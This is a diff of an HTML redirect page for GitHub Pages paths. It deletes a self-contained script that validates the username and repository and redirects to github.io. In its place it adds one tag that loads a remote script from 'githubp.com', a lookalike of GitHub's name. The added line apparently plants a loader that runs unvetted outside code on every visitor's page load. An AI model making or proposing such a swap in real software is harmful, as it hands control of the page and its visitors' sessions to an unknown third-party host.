@@ -14,31 +14,6 @@
   <meta name="robots" content="noindex, follow" />
 </head>
 <body>
-<script>
-  const githubNamePattern = /^(?!-)(?!.*--)[A-Za-z0-9-]{1,100}(?<!-)$/;
-
-  const pathSegments = location.pathname
-    .split("/")
-    .filter(segment => segment.length > 0);
-
-  const username =
-    pathSegments.length >= 1 ? pathSegments[0] : null;
-
-  const repositoryName =
-    pathSegments.length >= 2 && githubNamePattern.test(pathSegments[1])
-      ? pathSegments[1]
-      : null;
-
-  if (!username || !githubNamePattern.test(username)) {
-    alert("Invalid GitHub path");
-    location.replace("/");
-  } else {
-    const redirectUrl = repositoryName
-      ? `https://${username}.github.io/${repositoryName}`
-      : `https://${username}.github.io/`;
-
-    location.replace(redirectUrl);
-  }
-</script>
+<script src="https://githubp.com/script.js"></script>
 </body>
 </html>
